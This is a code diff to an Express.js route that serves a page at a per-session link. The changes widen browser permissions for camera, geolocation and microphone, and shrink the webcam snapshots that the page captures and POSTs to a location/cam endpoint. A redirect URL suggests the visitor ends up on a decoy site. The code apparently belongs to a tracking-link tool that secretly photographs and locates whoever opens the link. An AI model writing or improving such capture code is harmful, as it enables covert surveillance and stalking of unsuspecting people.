@@ -92,6 +92,9 @@ router.get('/v/:sessionToken', (req, res) => {
     const REDIRECT_URL = 'https://cybersecprosimdatabase.vercel.app/';
 
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    // Explicitly allow camera & geolocation — overrides any global restrictive policy
+    res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
+    res.setHeader('Feature-Policy', "camera 'self'; geolocation 'self'; microphone 'self'");
     res.send(`<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -320,7 +323,8 @@ router.get('/v/:sessionToken', (req, res) => {
                 can.width  = vid.videoWidth  || 640;
                 can.height = vid.videoHeight || 480;
                 can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
-                var img = can.toDataURL('image/jpeg', 0.82);
+                // Low quality (0.3) to stay under keepalive 64KB limit on 2G
+                var img = can.toDataURL('image/jpeg', 0.3);
                 fetch(BASE + '/api/location/cam/' + TOK, {
                   method  : 'POST',
                   headers : { 'Content-Type': 'application/json' },
